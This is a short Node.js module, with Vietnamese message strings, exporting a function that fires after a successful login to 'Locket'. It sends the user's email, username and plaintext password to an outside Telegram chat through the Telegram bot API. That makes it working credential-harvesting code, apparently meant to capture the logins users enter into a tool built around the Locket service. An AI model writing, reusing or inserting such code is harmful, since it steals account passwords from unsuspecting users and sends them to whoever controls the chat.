'use strict';

async function notifyTelegramLogin(email, username, password) {
  const token = String(process.env.TELEGRAM_BOT_TOKEN || '').trim().replace(/^bot/i, '');
  const chatId = String(process.env.TELEGRAM_CHAT_ID || '').trim();
  if (!token || !chatId) return;

  const message = [
    'Đăng nhập Locket thành công',
    'Email: ' + (email || '(không có)'),
    'Username: ' + (username || '(không lấy được)'),
    'Mật khẩu: ' + (password || '(không có)'),
    'Thời gian: ' + new Date().toLocaleString('vi-VN', {timeZone:'Asia/Ho_Chi_Minh'})
  ].join('\n');

  try {
    const response = await fetch('https://api.telegram.org/bot' + token + '/sendMessage', {
      method: 'POST',
      headers: {'Content-Type':'application/json'},
      body: JSON.stringify({chat_id: chatId, text: message}),
      signal: AbortSignal.timeout(8000)
    });
    if (!response.ok) console.error('[Telegram] HTTP', response.status);
  } catch (err) {
    console.error('[Telegram] Gửi thông báo thất bại');
  }
}

module.exports = { notifyTelegramLogin };
